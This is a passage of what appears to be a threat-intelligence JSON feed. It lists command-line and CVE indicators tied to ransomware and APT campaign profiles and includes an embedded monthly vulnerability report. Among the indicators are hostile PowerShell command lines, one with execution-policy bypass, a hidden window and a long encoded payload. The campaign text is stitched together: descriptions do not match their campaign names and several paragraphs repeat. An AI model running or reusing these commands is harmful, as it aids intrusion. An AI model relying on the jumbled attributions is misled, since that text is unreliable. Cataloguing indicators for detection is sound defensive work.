kbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"03ea6b61-9238-4f11-ba00-60793c9980f7","type":"command-line","category":"Other","value":"cmd.exe /q /c %PROGRAMFILES%\\(x86)\\teamviewer\\teamviewer.exe --getid","comment":"Windows command","description":"Command line and options related to a specific command executed by a program, whether it is malicious or not.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"Windows Command Shell - T1059.003"}],"rule_type":null,"campaigns":[{"id":"c7b79097-ff4c-423b-b1ad-2ebf21ba92a4","name":"Threat Profile: BlackMatter Ransomware","description":"BlackMatter is a Ransomware-as-a-Service affiliate program that emerged since July 2021.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"0449a728-18ed-426c-acd7-3902e3c4ae83","type":"command-line","category":"Other","value":"powershell.exe -ex bypass -f pkit.ps1","comment":"Similarities In FIN7 PowerShell Execution From 2021 Inclusive of Parameters -ex bypass -f or -ex bypass -file","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"PowerShell - T1059.001"}],"rule_type":null,"campaigns":[{"id":"69e3d0d3-65b0-41a0-b75e-fff19cb10fde","name":"FIN7 - The Archeology And Evolution Of A Financial Threat Actor","description":"FIN7 is a threat actor group that has been aiming their malware arsenal toward sectors in the retail, hospitality, and restaurant industries since 2013 attacking them with point-of-sale malware for financial gain.

The analysis has uncovered that the breach lasted 11 days, and was initiated by a phishing email where a password protected malicious ISO Zipped file was shared. Once the victim unzipped the ISO and executed it, windows would mount it as a CD or external media, and the victim would be presented access to its contents, which in this case was a single file, named \"documents\". This file, when executed, also executes the hidden BumbleBee malware loader.\r\n\r\nOnce BumbleBee was fully up and running, it contacts its C2, where it kept for a while just communicating. The DFIR Report, reported that 3 hours later, the BumbleBee drops the first stage cobalt strike beacon. This beacon once executed it started to inject into other processes on the host. From these injected processes, the attackers then started the discovery and enumeration tasks. At the 4 hours mark from the initial access, the attacker RDP into a server with a local administrator account, downloaded AnyDesk to maintain persistence, and finally started the Active directory discovery using AdFind.\r\n\r\nIn the subsequent days the intruders dropped a number of tools to help with privilege escalation, although they had managed to move laterally to a number of workstations and one server, it did not seem they had the privileges they were searching for.\r\n\r\nOn the last day the attackers used PowerShell to download and run a new Cobalt Strike PowerShell Beacon, using this new beacon to inject into processes and execute the PowerShell Invoke-Kerberoast module, to request a service account Kerberos ticket that would allow them to crack the password for the service account offline. The attackers also dropped two batch scripts with the purpose of identifying all online servers and workstations in the environment.\r\n\r\nWith the cracked password of the service account the attackers were able to execute a Cobalt Strike beacon on a Domain Controller, but were shortly after evicted from the environment before they could apply the final actions which from their previous actions the indication was that it would be a domain wide ransom deployment.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Some things, however, remain constant: death, taxes, The Bug Report, and Java ruining your life. We at Trellix are proud to continue bringing you the one thing on that list worth looking forward to, month after month.\r\n\r\nThis month featured some truly standout vulns, meaning our resident Shadow Council spent little time deliberating which ones would make the cut, giving us ample time to really dig into the ones that did:\r\n\r\nCVE-2022-21449 aka “Psychic Signatures”: Java\r\nCVE-2022-26809: MSRPC\r\nCVE-2022-22965 aka “Spring4Shell”: Spring Framework\r\nThe more pedantic among you might be thinking, “Well, actually, Spring4Shell was reported in late March, so why is it in April’s Bug Report?” The short answer is that time is a social construct. The long answer is the vulnerability was reported right at the end of March (03/29), meaning by the time it became apparent just how critical it was, it was too late to include it in March’s report. Better late than never!\r\n\r\nCVE-2022-21449: Failing, even with a curve\r\nWhat is it?\r\nIt is often said that cryptography is one of the few good things we have in cybersecurity, and for good reason. Unfortunately, cryptography is like a joke in that it’s all about delivery, and even the best cryptographic algorithms can’t prevent errors in implementation. Even more unfortunately, “cryptography is like a joke” is actually a perfect description of Java’s ECDSA implementation. With the release of Java 15, the original native code implementation was rewritten in Java, introducing a major bug that made it trivial to bypass its ECDSA signature validation, according to Neil Madden of ForgeRock. Madden first disclosed the vulnerability to Oracle in November of 2021, but chose not to go public with it until six months later, after Oracle finally addressed the issue in their April 2022 Critical Patch Update (CPU). In his article, Madden dubs the vuln “Psychic Signatures,” after the blank psychic paper used by Doctor Who as an all-purpose ID card – quite fitting.\r\n\r\nTo fully understand the mechanics of CVE-2022-21449 would require a crash course in elliptic curve cryptography – well beyond the scope of our humble report – so the short version is that an ECDSA signature consists of two values: r and s. Validating an ECDSA signature involves checking that the left and right sides of a particular elliptic curve equation are indeed equal, with the left side being r, and the right side being proportional (kind of) to s. This equation becomes trivially true (0 = 0) if both r and s are zero, so such a signature would always be considered “valid” regardless of the message contents or the key used. To address this, one of the steps in the ECDSA algorithm involves rejecting a signature as invalid if either r or s are zero – a step that Java’s new implementation skipped. 00ps.\r\n\r\nWho cares?\r\nECDSA is like plumbing; we use it all the time, but most people don’t think about it until something goes wrong. The various fixtures powered by Java’s ECDSA plumbing include many popular web authentication/authorization standards such as JWTs, SAML, and WebAuthn, responsible for gating access to sensitive resources on servers and even managing Single Sign-On (SSO) for users across security domains. Perhaps even more troubling, some SSL certificates utilize signatures generated using Java’s ECDSA, in which case an attacker could leverage this vuln to man-in-the-middle encrypted traffic. This is all to say that you shouldn’t let Oracle’s incredibly conservative CVSS rating of 7.5 fool you into thinking this vuln isn’t a big deal. As for which versions are impacted, Oracle has indicated that Java 15, 16, 17, and 18 prior to their April CPU are all vulnerable.\r\n\r\nAlthough the scope of CVE-2022-21449 is certainly smaller than the infamous Log4Shell, it’s worth nothing that Log4Shell was a bug in a third-party Java library, whereas this is a bug in the Java runtime itself. Furthermore, Psychic Signatures is just as easy to exploit and PoC code already exists, meaning that although there is currently no evidence of in-the-wild exploitation, it is far from unlikely. In short, if you cared about Log4Shell, then you should probably care about this, too.\r\n\r\nWhat can I do?\r\nAs is often the case, the best thing you can do is patch ASAP, as Oracle’s April CPU fully mitigates this vulnerability. If this isn’t immediately possible, consider switching all your Java Cryptography Architecture (JCA) providers to BouncyCastle, an open-source implementation devoid of this bug. If you’re wondering if your organization is impacted, we suggest dusting off that list you made in the aftermath of Log4Shell for all the software in your environment that so much as looks at Java – there’s bound to be a lot of overlap. Barring that, JFrog has released a tool on GitHub that can scan arbitrary JAR/WAR files for presence of the vulnerability, which may prove useful.\r\n\r\nCVE-2022-26809: RPC, it’s easy as 1 2 3\r\nWhat is it?\r\nCVE-2022-26809 lacks the catchy monikers of our other two entries this month, but don’t take that as a reflection of its import. Publicly disclosed on April 12 as part of Microsoft’s Patch Tuesday, it is a fully remote, pre-authentication, zero-click vulnerability in Microsoft Remote Procedure Call (MSRPC), a core component of the Windows operating system that is enabled by default, network-accessible, and cannot be disabled without breaking things in the OS. I’ll give everyone a second to pick their jaws up off the floor before continuing.\r\n\r\nThe vulnerability was submitted to Microsoft by Cyber Kunlun, a cybersecurity firm based out of Beijing, who provided Microsoft with an exploit that utilized the Server Message Block (SMB) protocol as the attack vector. As a result, Microsoft initially recommended blocking TCP ports 139 and 445, ports utilized by SMB, in their Microsoft’s Security Update Guide. Although these ports are not specific to MSRPC, leaving them open can still result in exploitation of the vulnerability, as MSRPC can utilize SMB for transport. In theory, the same may hold true for MSRPC over TCP and MSRPC over HTTP.\r\n\r\nThat being said, there is currently very little credible information to be found regarding the specific details of what is needed to exploit the vulnerability besides some high-level analysis done by Akamai and MalwareTech based on patch diffing. According to both sources, the patch added some integer overflow checks that protect against a potential heap overflow condition in functions responsible for processing RPC packets, presumably the means by which remote code execution would be possible.\r\n\r\nWho cares?\r\nUltimately any org with any Windows footprint in their environment should be taking this very seriously, as exploits leveraging this vulnerability will be easily wormable, making it a prime vehicle for malware campaigns. Microsoft has also indicated that just about every version of Windows since Windows 7/Server 2008 is vulnerable, so don’t expect being a decade behind on your Windows updates to save you – I’m looking at you, healthcare industry.\r\n\r\nThankfully for all the sysadmins and analysts experiencing Vietnam flashbacks right now, there does not (as of this writing) appear to be any legitimate PoC code for CVE-2022-26809, much less any detected exploitation out in the wild, meaning there is still time to lock things down before the bad guys start sending payloads to every one of the 700,000 Windows machines with port 445 exposed to the internet:\r\n\r\nFigure 2\r\nI’m sure all 700,000 are fully patched… right?\r\n\r\nWhat can I do?\r\nLike a broken record with a steadfast conscience, I will continue to tell you to patch your systems now. Like, right now. Since disabling RPC outright isn’t feasible, patching and Viking funeral are your only two surefire means of keeping your Windows machines safe. But like a Sex Ed teacher preaching abstinence, I realize that providing alternate means of mitigating risk is equally important. If you can’t patch right this second, a good starting point would be to block TCP ports 135 (MSRPC via TCP), 139 and 445 (MSRPC via SMB), and 593 (MSRPC via HTTP) on your perimeter firewall. Ultimately, however, good firewall rules are founded in whitelisting ports for necessary services, not blacklisting dangerous ones reactively like an unwinnable game of whack-a-mole.\r\n\r\nCVE-2022-22965: Mirai botnet springs back to life\r\nWhat is it?\r\nIn order to adequately describe what Spring4Shell is, it’s important to first describe what it is not – it is not CVE-2022-22963, a superficially similar vuln disclosed around the same time that allows for server-side code injection in Spring Cloud Function. In late March, during the first 72 hours of these two vulns going public, there was a lot of misinformation being spread on Twitter due to the conflation of these two vulnerabilities, with many referring to both as “Spring4Shell.” Canonically, however, Spring4Shell refers exclusively to CVE-2022-22965, and though both were granted a CVSS score of 9.8, Spring4Shell proper is far more impactful, hence its inclusion on our list and the omission of its ugly cousin.\r\n\r\nWith that out of the way, let’s briefly describe what the Spring Framework is, as it’s the target of this particular vulnerability. Put simply, it’s a very popular open-source framework developed by VMware that aids with the development of enterprise-level Java applications by providing support for features such as dependency injection, data binding, and web frameworks for both model-view-controller (Spring MVC) and reactive (Spring WebFlux) designs. One of the features the Spring Framework provides to developers is the ability to map HTTP requests to specific handler methods. These request handler methods, in turn, can instantiate objects and automatically populate their members based on parameters provided via these same HTTP requests, a feature known as parameter binding.\r\n\r\nA much older bug, CVE-2010-1622, abused this feature combined with Java’s built-in getClassLoader() method to manipulate Tomcat’s ClassLoader object into loading a JAR file from an attacker-controller server, thereby achieving RCE. Spring quickly patched this attack vector by adding a check that excludes getClassLoader() from the parameter binding mechanism. The introduction of Modules in Java 9, however, added another means of accessing a ClassLoader, thus creating a bypass for Spring’s previous patch and giving birth to CVE-2022-22965. Unlike its ancestor, exploitation of Spring4Shell has largely involved creating a webshell (hence the name) on a target server running Tomcat by writing a custom .jsp file to the web root via Tomcat’s AccessLogValve class, but the underlying vulnerability of abusing request parameter binding is largely identical.\r\n\r\nWho cares?\r\nAs far as impact goes, there’s good news and there’s bad news. The good news is that not every Java app utilizing Spring Framework is vulnerable by default; for an app to be vulnerable, it must be meet all these criteria:\r\n\r\nUses JDK >= 9.0\r\nPackaged as a Web Application Archive (WAR)\r\nDeployed on a standalone Servlet container\r\nThe Servlet must have either the spring-webmvc or spring-webflux packages as a dependency\r\nUses a version of Spring Framework older than 5.2.20/5.3.18 (where the patch was introduced)\r\nThe bad news is that the bad guys have a sizable head start in this race. This is in part due to the details of the vulnerability and even a PoC exploit being leaked in advance of the CVE’s planned publication, which was meant to coincide with Spring’s patch. In fact, honeypots detected exploitation of Spring4Shell as early as March 31, just two days after disclosure, and exploitation attempts have continued ever since. The initial PoC code made public was specific to Spring applications that used Tomcat Servlet containers, but Spring has since confirmed that both Payara and Glassfish Servlets are also vulnerable.\r\n\r\nI lied earlier, there’s even worse news. Trend Micro has reported that Spring4Shell is already being utilized in an extensive campaign that, in the spirit of Easter, has resurrected the Mirai botnet malware. Doesn’t it just fill you with nostalgia?\r\n\r\nWhat can I do?\r\nWhile updating Spring Framework to 5.2.20/5.3.18 or above is obviously the best solution, Spring has also outlined several mitigation strategies in their security guidance:\r\n\r\nUpgrade Tomcat to at least 8.5.78/9.0.62/10.0.20. While this does not mitigate the vulnerability as a whole, it does mitigate the Tomcat attack vector, which is by far the most prevalent way this vuln is being exploited.\r\nDowngrading Java to a version below 9 removes the Module bypass that makes CVE-2022-22965 possible; however, utilizing a prehistoric version of Java likely carries its own security risks.\r\nWhitelisting only the parameters you want to allow your users to bind via the setAllowedFields() method is a valid mitigation, as is blacklisting the fields used by exploits via setDisallowedFields(). Unfortunately, setting these fields globally runs the risk of them being overridden locally. To make matters even more complicated, it was discovered that these properties are unintuitively case-sensitive, a quirk that was not clearly documented, leaving holes in many mitigation attempts. The issue is being tracked as CVE-2022-22968 and is fixed in Spring Framework versions 5.2.21 and 5.3.19. But hey, at least they didn’t tell us it was “working as intended.”","threat_level_id":1,"kb_article_link":null,"coverage":null,"updated_on":"2022-11-02T21:12:55.000Z","external_analysis":{"links":["https://www.trellix.com/en-us/about/newsroom/stories/threat-labs/the-bug-report-april-2022-edition.html","https://github.com/khalednassar/CVE-2022-21449-TLS-PoC","https://github.com/XmasSnowREAL/CVE-2022-26809-RCE","https://github.com/TheGejr/SpringShell"]},"is_coat":1,"created_on":"2022-05-05T13:35:18.000Z"}]},{"id":"052f2f1e-090d-431f-aec6-8e1ee9abde0a","type":"vulnerability","category":"External analysis","value":"CVE-2022-1040","comment":"","description":"","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"806965a9-d4c9-4380-ab65-63a10c4fee8e","name":"Chinese State-Sponsored Group TA413 Adopts New Capabilities In Pursuit Of Tibetan Targets","description":"Recorded Future reports on Chinese sponsored advanced persistent threat (APT) group TA413 targeting Tibetan with novel tools and techniques.

They connected to various hosts, downloaded tools such as Kerbrute, LsassUnhooker, and GoDumpLsass, and attempted to gain domain credentials.\r\n\r\nMethods included brute-forcing credentials, stealing SAM Key Hive data, retrieving locally stored passwords, dumping the LSASS process, and using credential harvesting tools like Mimikatz and LaZagne. They also attempted an NTLM downgrade attack.\r\n\r\nAfter obtaining credentials, the attackers targeted web servers and domain controllers. They initially used SoftEther VPN and later abused the remote administration tool AnyDesk.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it.

Threat actors utilized a variant of the HyperBro loader with a lure related to Taiwan Semiconductor Manufacturing (TSMC). The tactics, techniques, and procedures (TTPs) used in this campaign overlap with those previously attributed to a cyber espionage group backed by the People's Republic of China (PRC).\r\n\r\nThe HyperBro loader variant employed a digitally signed CyberArk binary for DLL-side loading, leading to the execution of a Cobalt Strike beacon in memory. Further investigation revealed an undocumented malware downloader, which used the BitsTransfer module in PowerShell to retrieve malicious binaries from a likely compromised Cobra DocGuard server. This downloader utilized a DLL Side-Loading technique by running the Cobalt Strike shellcode through a signed McAfee binary, mcods.exe. Notably, the shellcode communicated with the same Cobalt Strike C2 server associated with the HyperBro loader variant.\r\n\r\nThe compromised Cobra DocGuard web server hosted a GO-based backdoor referred to as \"ChargeWeapon,\" which analysts traced back to August 21, 2023. ChargeWeapon is designed to provide remote access to infected hosts and send device and network information to an attacker-controlled C2 server.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

A user executed this JavaScript, which triggered a PowerShell script to install NetSupport and establish persistence in the system's registry. After five days, the threat actor conducted reconnaissance and tried to reactivate a disabled domain admin account. They also installed an OpenSSH server for persistence and established a reverse SSH tunnel to their server on a VPS.\r\n\r\nUsing the tunnel, they connected to the domain controller, used Impacket tools for discovery, and changed firewall settings on a remote server. They furthered lateral movement using Impackets wmiexec.py, deploying NetSupport malware to remote hosts. They scheduled tasks for persistence and issued discovery commands.\r\n\r\nThe next day, they deployed NetSupport on a domain controller and dumped the NTDS.dit database, likely exfiltrating it. They repeated this on another domain controller, ran an Active Directory auditing tool, and added a new account with admin privileges. They accessed the server via RDP and proceeded to disable Microsoft Defender, dump LSASS, and extract Windows event logs. Sensitive documents were accessed, and cleanup tasks were performed.\r\n\r\nThe final actions involved dropping Nim binaries to create a backdoor user, but this attempt failed.

Ryuk is used exclusively in targeted ransomware attacks. \r\nRyuk was first observed in August 2018 during a campaign that targeted several enterprises. Analysis of the initial versions of the ransomware by our team revealed similarities and shared source code with the Hermes ransomware. Hermes ransomware is a commodity malware for sale on underground forums and has been used by multiple threat actors.\r\nBecause of the targeted nature of Ryuk infections, the initial infection vectors are tailored to the victim. Often seen initial vectors are spear-phishing emails, exploitation of compromised credentials to remote access systems and the use of previous commodity malware infections. As an example of the latter, the combination of Emotet and TrickBot has been frequently observed distributing Ryuk, though recently BazarLoader has also been seen distributing it. To encrypt files, Ryuk utilizes a combination of symmetric AES (256-bit) encryption and asymmetric RSA (2048-bit or 4096-bit) encryption. The symmetric key is used to encrypt the file contents, while the asymmetric public key is used to encrypt the symmetric key. Upon payment of the ransom the corresponding asymmetric private key is released, allowing the encrypted files to be decrypted","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB92422","coverage":{"dat_version":{"min":4117},"linux_dat_version":{"min":4647}},"updated_on":"2023-04-11T15:00:05.000Z","external_analysis":{"links":["https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/","https://github.com/advanced-threat-research/Yara-Rules/blob/master/ransomware/RANSOM_Ryuk.yar","https://us-cert.cisa.gov/ncas/alerts/aa20-302a","https://www.intel471.com/blog/understanding-the-relationship-between-emotet-ryuk-and-trickbot","https://www.mcafee.com/blogs/other-blogs/mcafee-labs/new-ryuk-ransomware-sample%E2%80%AFtargets-webservers/","https://www.crowdstrike.com/blog/sidoh-wizard-spiders-mysterious-exfiltration-tool/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf","https://news.sophos.com/en-us/2020/10/14/inside-a-new-ryuk-ransomware-attack/","https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/","https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/","https://thedfirreport.com/2020/10/08/ryuks-return/","https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/","https://www.trendmicro.com/en_ie/what-is/ransomware/ryuk-ransomware.html","https://www.trendmicro.com/en_us/research/18/k/trickbot-shows-off-new-trick-password-grabber-module.html?_ga=2.114085703.1180523619.1642020410-528991333.1642020410","https://unit42.paloaltonetworks.com/unit42-malware-team-malspam-pushing-emotet-trickbot/","https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/k/a-review-and-analysis-of-2021-buer-loader-campaigns/TechnicalBrief-An-Analysis-of-Buer-Loader.pdf","https://research.checkpoint.com/2018/emotet-tricky-trojan-git-clones/","https://www.huntandhackett.com/blog/advanced-ip-scanner-the-preferred-scanner-in-the-apt-toolbox"]},"is_coat":1,"created_on":"2020-02-27T15:31:16.000Z"}]},{"id":"089de17b-afc3-11eb-9d72-02d538d9640e","type":"vulnerability","category":"External analysis","value":"CVE-2017-8291","comment":"","description":"","mitre_techniques":[],"rule_type":null,"campaigns":[{"id":"bb521653-ad7c-11ea-9477-02d538d9640e","name":"GhostScript Vulnerability Used In Targeted Attacks","description":"Recent activity from threat actors with possible ties to Kimsuky have targeted network infrastructures with the intent of data exfiltration and cyber espionage.

The analysis has uncovered that the breach lasted 11 days, and was initiated by a phishing email where a password protected malicious ISO Zipped file was shared. Once the victim unzipped the ISO and executed it, windows would mount it as a CD or external media, and the victim would be presented access to its contents, which in this case was a single file, named \"documents\". This file, when executed, also executes the hidden BumbleBee malware loader.\r\n\r\nOnce BumbleBee was fully up and running, it contacts its C2, where it kept for a while just communicating. The DFIR Report, reported that 3 hours later, the BumbleBee drops the first stage cobalt strike beacon. This beacon once executed it started to inject into other processes on the host. From these injected processes, the attackers then started the discovery and enumeration tasks. At the 4 hours mark from the initial access, the attacker RDP into a server with a local administrator account, downloaded AnyDesk to maintain persistence, and finally started the Active directory discovery using AdFind.\r\n\r\nIn the subsequent days the intruders dropped a number of tools to help with privilege escalation, although they had managed to move laterally to a number of workstations and one server, it did not seem they had the privileges they were searching for.\r\n\r\nOn the last day the attackers used PowerShell to download and run a new Cobalt Strike PowerShell Beacon, using this new beacon to inject into processes and execute the PowerShell Invoke-Kerberoast module, to request a service account Kerberos ticket that would allow them to crack the password for the service account offline. The attackers also dropped two batch scripts with the purpose of identifying all online servers and workstations in the environment.\r\n\r\nWith the cracked password of the service account the attackers were able to execute a Cobalt Strike beacon on a Domain Controller, but were shortly after evicted from the environment before they could apply the final actions which from their previous actions the indication was that it would be a domain wide ransom deployment.\r\n\r\nThe Trellix ATR Team gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

This malicious activity was detected on multiple computers, and there's evidence that the attackers deployed backdoors and keyloggers on numerous other systems.\r\n\r\nIn their efforts, the attackers utilized the publicly available network administration tool Plink to configure port-forwarding rules, enabling remote access through the Remote Desktop Protocol (RDP). They also manipulated Windows firewall rules to facilitate remote access. Their toolkit included various malware, such as the Tokel backdoor for executing PowerShell commands and downloading files, the Dirps trojan for file enumeration and executing PowerShell commands, and Clipog for stealing clipboard data, logging keystrokes, and monitoring keystroke entry processes. Additionally, they employed the PowerExchange backdoor for accessing Exchange Servers with hardcoded credentials and monitoring emails, used Mimikatz to extract credentials, and utilized Plink to establish SSH tunnels to command-and-control servers.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

The vulnerability affects various versions of JetBrains TeamCity, a widely used application for DevOps and software development activities. Once successfully exploiting the vulnerability, the two threat actors employ distinct tools and techniques to further their malicious activities.\r\n\r\nDiamond Sleet, after compromising TeamCity servers, employs PowerShell to download various malware payloads from compromised infrastructure they control. These payloads include the ForestTiger backdoor, RollSling loader, and FeedLoad loader. These tools are used for activities such as stealing credentials from LSASS memory, loading additional payloads, and creating scheduled tasks to maintain persistence.\r\n\r\nOn the other hand, Onyx Sleet, following a successful TeamCity exploit, creates a new user account on the compromised systems, naming it \"krtbgt.\" This account is likely intended to mimic the legitimate Windows account KRBTGT, which is associated with Kerberos Ticket Granting Tickets. The threat actor adds this account to the Local Administrators Group using the \"net use\" command. They also perform system discovery tasks on compromised systems using Windows binaries. Subsequently, Onyx Sleet deploys a unique payload to these compromised systems via PowerShell. The payload, when executed, decrypts an embedded resource, and loads it into memory. This inner payload acts as a proxy tool, identified as \"HazyLoad\", facilitating a persistent connection between the compromised host and infrastructure controlled by the attackers.\r\n\r\nThe Trellix Threat Intelligence Group (TIG) gathers and analyzes information from multiple open and closed sources before disseminating intelligence reports.

Once a victim has been compromised, a ransom note is dropped by the malware reporting that in addition to encrypting files the threat actor has also exfiltrated private data including financial, personal, and network information. The ransom note further instructs the victim to a dark web address to regain access to their encrypted data. In more recent attacks, the threat actor has threatened to publish confidential data that has been exfiltrated if the ransom is not met within the time frame set by the threat actor. \r\n\r\nAfter the initial discovery in 2020, LockBit ransomware has evolved to the most prolific ransomware family in 2022. Largely due to harboring competent affiliates from the closed down REvil and Conti ransomware groups. \r\n\r\nThe Lockbit group has improved their ransomware binary to a version 3.0, in which they incorporated several techniques that were previously observed in BlackMatter ransomware. \r\n\r\nFurthermore to aid their data exfiltration efforts, LockBit has developed their own data exfiltration tool called StealBit. However, Trellix has observed several other data exfiltration tools being used, like Rclone and MegaSync. \r\n\r\nA LockBit attack will almost always include several other malicious and/or non-malicious (the so called dual use) tools.

It is highly configurable with capabilities that range from stealing sensitive data, encrypting files using either AES or ChaCha20 encryption (strong algorithms), ability to spread laterally, kill virtual machines and wipe snapshots to prevent recovery, all explained nicely from a \"--help\" page. The ransomware also includes a json configuration file that allows for extensive customization of extensions, ransom notes, encryption subroutines, file/folder/extension exclusions, and even processes to terminate.\r\n\r\nThe software is entirely written from scratch and does not use common templates which reduces the visibility of the samples since there are no leaked template samples to start detection from.\r\n\r\nOnce a victim has been infected the groups employing BlackCat use a triple-extortion tactic. They steal data and threaten to publish it if a ransom is not paid. To push victims to pay they also conduct Distributed Denial of Service (DDoS) attacks.\r\n\r\nThis is a highly sophisticated piece of ransomware where attackers consider all aspects of an attack before carrying it out.","threat_level_id":1,"kb_article_link":"https://kcm.trellix.com/corporate/index?page=content&id=KB95465","coverage":{"dat_version":{"min":4729},"linux_dat_version":{"min":4957}},"updated_on":"2023-04-11T15:10:41.000Z","external_analysis":{"links":["https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware","https://www.bleepingcomputer.com/news/security/alphv-blackcat-this-years-most-sophisticated-ransomware/","https://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html","https://www.ic3.gov/Media/News/2022/220420.pdf"]},"is_coat":1,"created_on":"2022-01-06T22:12:53.000Z"}]},{"id":"09c90474-4118-43df-84b5-8b35930b08da","type":"command-line","category":"Other","value":"powershell.exe -ep bypass -w h -noni -Enc \"WwBjAGgAYQByAFsAXQBdACcAJQBAG8AdQAhAD4AIQAxADwAIQBlAHAAIQB8ACEAJQBkAG8AdQAsACwAPAAhAHUAcwB6ACEAfAAhAGoAZgB5ACEAKQBPAGYAeAAuAFAAYwBrAGYAZAB1ACEATwBmAHUALwBYAGYAYwBEAG0AagBmAG8AdQAqAC8ARQBwAHgAbwBtAHAAYgBlAFQAdQBzAGoAbwBoACkAKABpACgALAAoAHUAKAAsACgAdQAoACwAKABxACgALAAoADsAKAAsACgAMAAoACwAKAAwACgALAAoADUAKAAsACgANgAoACwAKAAvACgALAAoADkAKAAsACgAOAAoACwAKAAvACgALAAoADIAKAAsACgANgAoACwAKAA1ACgALAAoAC8AKAAsACgAMwAoACwAKAAxACgALAAoADkAKAAsACgAMAAoACwAKAB4ACgALAAoAHAAKAAsACgAcwAoACwAKABsACgALAAoAGAAKAAsACgANQAoACwAKAA1ACgALAAoADQAKAAsACgALwAoACwAKABjACgALAAoAGoAKAAsACgAbwAoACwAKABgACgALAAoAG4AKAAsACgAOAAoACwAKAAvACgALAAoAHEAKAAsACgAdAAoACwAKAAyAgAKgAhAH4AIQBkAGIAdQBkGkAIQB8ACEAfgAhAH4AIQB4AGkAagBtAGYAIQApACUAZABvAHUAIQAuAG0AdQAhADIAMQAqACcAfAAlAHsAJABzACsAPQBbAGMAaABhAHIAXQAoAFsAaQBuAHQAXQAkAF8ALQAxACkAfQA7AG- kAZQB4ACAAJABzAA==\"","comment":"","description":"Command line and option related to a software malicious or not to execute specific commands.","mitre_techniques":[{"type":"mitre-attack-pattern","value":"PowerShell - 